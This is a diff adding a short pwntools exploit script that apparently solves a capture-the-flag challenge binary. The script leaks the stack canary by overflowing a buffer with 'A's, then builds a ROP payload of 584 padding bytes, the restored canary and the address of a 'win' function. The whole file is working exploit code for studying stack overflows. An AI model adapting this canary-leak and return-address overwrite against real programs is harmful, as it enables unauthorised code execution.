@@ -1,0 +1,20 @@
+from pwn import *
+exe = context.binary = ELF("./chall")
+r = process()
+sleep(3)
+r.send(b"A" * 85)
+r.recvuntil(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
+data = r.recvline().strip()
+leak = b"\x00" + data[:-32]  # Last 7 bytes after the null
+print(leak)
+fix_canary = u64(leak)
+log.info(f"FIX CANARY : {hex(fix_canary)}")
+r.sendline("1")
+new_offset = 584
+rop = ROP(exe)
+rop.raw(b"A" * new_offset)
+rop.raw(fix_canary)
+rop.raw(b"B" * 8)
+rop.raw(exe.sym['win'])
+r.sendline(rop.chain())
+r.interactive()
